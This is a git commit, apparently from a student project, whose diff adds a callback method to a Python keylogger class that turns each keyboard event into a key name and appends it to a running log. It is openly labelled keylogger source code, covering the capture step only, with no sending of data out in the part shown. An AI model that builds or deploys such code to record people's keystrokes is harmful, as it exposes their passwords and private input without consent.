b643492cff2ac66b9c3d9b0257a7350d8687b3bb
morrimeg <morrimeg@oregonstate.edu>
2020-12-21 14:07:22 -0700

    callback method created

--- keylogger.py
+++ keylogger.py
@@ -28,3 +28,35 @@ class keyLogger():
         # record start & end dates
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+
+
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+
+            elif name == "decimal":
+                name = "."
+
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
+
+
